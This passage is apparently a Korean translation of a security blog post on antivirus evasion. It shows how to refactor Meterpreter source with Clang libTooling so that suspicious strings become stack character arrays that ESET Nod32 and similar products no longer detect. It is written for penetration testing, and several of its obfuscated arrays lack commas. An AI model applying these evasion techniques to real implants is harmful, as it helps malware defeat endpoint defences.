    <content type="html"><![CDATA[<p>안녕하세요. 하지 말라는 것은 더 하고 싶은 idioth입니다.</p><p>원래 사람은 하지 말라면 더 하고 싶은 법. 그래서 평소 탐지 우회하는 것에 대해 관심이 많은데 관련 글이 있길래 들고 왔습니다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/image.jpg"></p><p>평소에는 그냥 혼자 공부하고 혼자 보는거라 직독직해 해놓고 스스로 머릿 속에서 정리하였는데 글로 적으려니 고생을 좀 했습니다. 영어 실력이 좋은 것도 아니고 번역을 많이 해본 것도 아니라 의역과 오역이 난무하는 글이 될 것 같습니다…</p><p>보시다가 이 부분은 왜 이렇게 번역이 됐지? 혹은 너무 이상한데? 하시는 것 있으시면 댓글로 달아드리면 눈물 흘리며 수정하도록 하겠습니다!</p><blockquote><p>원문 글 : <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">Engineering Antivirus evasion</a></p></blockquote><p><strong>tl;dr:</strong> 이 게시물은 모든 AV/EDR을 우회하기 위해 자동으로 Meterpreter을 refactoring 하는 것에 대해 설명한다. 모든 기술에 대한 아이디어와 문자열 난독화 패스의 구현이 상세히 설명되어있다. API import를 숨기는 것과 syscall 재작성에 대한 자세한 내용은 게시글이 너무 길어지므로 다음 글에서 소개할 것이다. 소스코드는 <a href="https://github.com/scrt/avcleaner">github</a>에서 확인할 수 있다.</p><p>기업이 정보 시스템을 보호하기 위해서 안티 바이러스와 EDR 같은 보안 소프트웨어는 필수적이다. 과거에는 모든 멀웨어 탐지 기술을 우회하기가 쉬웠지만 탐지 기술이 발전함에 따라 우회에 더 많은 노력이 필요하다.</p><p>취약점을 증명하기 위한 Proof-of-Concept가 안티 바이러스에 의해 차단된 경우 위험성에 대해 이야기하는 것은 매우 어렵다. 이론적으로 탐지를 우회하는 것이 가능하다고 얘기할 수 있지만 증명하기가 어렵다.</p><p> 또한 시스템의 existing foothold에서만 발견할 수 있는 취약점들이 있다. pentester가 initial level에 접근할 수 없는 경우 시스템의 실제 보안 상태를 도출할 수 없다.</p><p>따라서 안티바이러스 소프트웨어 우회는 필요하다. SCRT(필자의 팀)에서는 공개적으로 사용 가능한 오픈 소스 툴을 사용해 툴을 사용하는데 숙련된 누구나 따라 할 수 있으며 private 하고 비싼 툴에 의존하지 않아도 된다는 점을 강조한다.</p><h1 id="문제점"><a href="#문제점" class="headerlink" title="문제점"></a>문제점</h1><p>사람들은 안티 바이러스의 탐지가 정적인지 동적인지 분류하는 것을 좋아한다. 보통 실행 전에 트리거 되면 정적 탐지로 간주된다. 하지만 프로세스 생성, in-memory file downloads 같은 이벤트를 통해 멀웨어 실행 시 signature와 같은 정적 탐지 메커니즘이 호출될 수 있다는 것은 아는 것이 좋다. 모든 보안 소프트웨어에 Meterpreter를 사용하려면 다음과 같이 수정해야 한다.</p><ul><li>파일 시스템 스캔 혹은 메모리 스캔 중에 모든 static signature 우회</li><li>userland API hooking 우회와 관련된 “행동 탐지” 우회</li></ul><p>Meterpreter는 여러 모듈로 구성되며 전체 코드 베이스의 양이 많고 계속 업데이트되므로 private fork를 수행하기 힘들다. 따라서 자동으로 코드 베이스를 수정할 방법이 필요하다.</p><h1 id="해결-방안"><a href="#해결-방안" class="headerlink" title="해결 방안"></a>해결 방안</h1><p>멀웨어 탐지는 대부분 문자열, API hook, 혹은 둘의 조합을 기반으로 한다.</p><p>Cylance 같은 머신러닝 classifier를 구현하는 제품에서도 문자열, API import, 후킹 할 수 있는 API 호출이 없는 멀웨어는 탐지를 우회할 수 있다.</p><p>Meterpreter는 수천 개의 문자열을 가지고 있고 API imports는 어떠한 방법으로도 숨겨지지 않으며 <code>WriteProcessMemory</code> 같은 민감한 API는 userland API hook으로 쉽게 intercept 할 수 있다. 따라서 자동화된 방식을 사용하여 2개의 솔루션을 만들어야 한다.</p><ul><li>Source-to-source code refactoring</li><li>LLVM 컴파일 시 코드 베이스 난독화</li></ul><p>후자가 선호되는 방식이며 많은 유명한 연구들에서 같은 결론에 도달했다. transformation pass를 한 번 작성해서 소프트웨어의 프로그래밍 언어나 target architecture에 상관없이 재사용할 수 있기 때문이다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/0.png"></p><p>이미지 출처: <a href="http://www.aosabook.org/en/llvm.html">http://www.aosabook.org/en/llvm.html</a></p><p>그러나 이 방법은 Visual Studio가 아닌 다른 컴파일러로 Meterpreter를 컴파일할 수 있어야 한다. 이를 수정하기 위해 2018년 12월에 몇 가지 작업을 퍼블리시했지만 1년이 더 지난 지금도 공식 코드 베이스에 적용되지 않았다.</p><p>그동안 우리는 첫 번째 접근법을 구현하기로 결정했다. 최첨단 소스 코드 refactoring를 살펴본 결과 <em>libTooling</em>(Clang/LLVM toolchain의 일부)이 C/C++ 소스의 구문 분석과 수정에 가장 적합했다.</p><p>Note: 코드 베이스는 Visual Studio 의존성이 강하기 때문에 Clang은 Meterpreter의 많은 부분의 구문 분석에 실패할 것이다. 그러나 타겟 안티바이러스를 50% 확률로 우회할 수 있었다. 또한 소스 코드를 변환하는 것이 컴파일 시에 변환하는 것보다 장점이 있을 것이다. 후자는 에러 없이 전체 프로젝트를 컴파일해야 하지만 전자는 수천 개의 컴파일 에러에 탄력적이며 불완전한 추상 구문 트리로 끝이 난다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/1.png"></p><p>LLVM passes vs libTooling</p><h2 id="문자열-난독화"><a href="#문자열-난독화" class="headerlink" title="문자열 난독화"></a>문자열 난독화</h2><p>C/C++에서 문자열은 다양한 context 안에 존재한다.</p><p><em>libTooling</em>을 사용하는 것은 복잡하므로 Meterpreter의 코드 베이스에서 의심스러운 문자열이 나타나는 부분을 보면 다음과 같다.</p><ul><li>function arguments</li><li>list initializers</li></ul><h3 id="Fcuntion-arguments"><a href="#Fcuntion-arguments" class="headerlink" title="Fcuntion arguments"></a>Fcuntion arguments</h3><p>ESET Nod32는 다음 코드에서 <code>ntdll</code> 문자열을 의심스러운 문자열로 탐지한다.</p><pre><code class="hljs cpp">ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))</code></pre><p>그러나 다음과 같이 코드를 재작성하면 성공적으로 탐지를 우회한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> ntdll_str[] = &#123;<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">0</span>&#125;;ntdll = LoadLibrary(ntdll_str)</code></pre><p>첫 번째 코드는 <code>.rdata</code> 섹션에 <code>&quot;ntdll&quot;</code> 문자열이 저장돼서 안티바이러스에게 쉽게 발견된다. 두 번째 코드는 문자열이 실행 시 스택에 저장돼서 보통 정적으로 구분할 수 없다. <em>IDA Pro</em>와 같은 툴에서는 문자열을 탐지할 수 있지만 바이너리를 더 복잡하게 분석해야 한다.</p><h3 id="List-initializers"><a href="#List-initializers" class="headerlink" title="List initializers"></a>List initializers</h3><p>Meterpreter의 코드 베이스에서 다음과 같은 구성은 <a href="https://github.com/rapid7/metasploit-payloads/blob/c8aa435b3c4872c58dba04acf53d157c3de2771c/c/meterpreter/source/extensions/extapi/extapi.c#L23">c/meterpreter/source/extensions/extapi/extapi.c</a>와 같은 파일에서 찾을 수 있다.</p><pre><code class="hljs cpp">Command customCommands[] =&#123;    COMMAND_REQ(<span class="hljs-string">&quot;extapi_window_enum&quot;</span>, request_window_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_enum&quot;</span>, request_service_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_query&quot;</span>, request_service_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_control&quot;</span>, request_service_control),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_get_data&quot;</span>, request_clipboard_get_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_set_data&quot;</span>, request_clipboard_set_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_start&quot;</span>, request_clipboard_monitor_start),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_pause&quot;</span>, request_clipboard_monitor_pause),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_resume&quot;</span>, request_clipboard_monitor_resume),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_purge&quot;</span>, request_clipboard_monitor_purge),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_stop&quot;</span>, request_clipboard_monitor_stop),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_dump&quot;</span>, request_clipboard_monitor_dump),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_adsi_domain_query&quot;</span>, request_adsi_domain_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_ntds_parse&quot;</span>, ntds_parse),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_wmi_query&quot;</span>, request_wmi_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_pageant_send_query&quot;</span>, request_pageant_send_query),    ...&#125;</code></pre><p>이 문자열들은 <code>ext_server_espia_x64.dll</code>의 <code>.rdata</code> 영역에 평문으로 저장되고 <em>ESET Nod32</em>에서 탐지된다.</p><p>이 문자열들은 list initialzier에 위치한 매크로의 매개변수이다. 목표는 자동으로 위의 코드를 다음과 같이 재작성하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> hid_extapi_UQOoNXigAPq4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_vhFHmZ8u2hfz[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_pW25eeIGBeru[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span><span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_S4Ws57MYBjib[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span><span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_HJ0lD9Dl56A4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_IiEzXils3UsR[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_czLOBo0HcqCP[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_WcWbTrsQujiT[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_rPiFTZW4ShwA[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_05fAoaZLqOoy[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span><span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_cOOyHTPTvZGK[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_smtmvW05cI9y[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_01kuYCM8z49k[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_SMK9uFj6nThk[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_PHxnGM7M0609[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_J7EGS6FRHwkV[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span 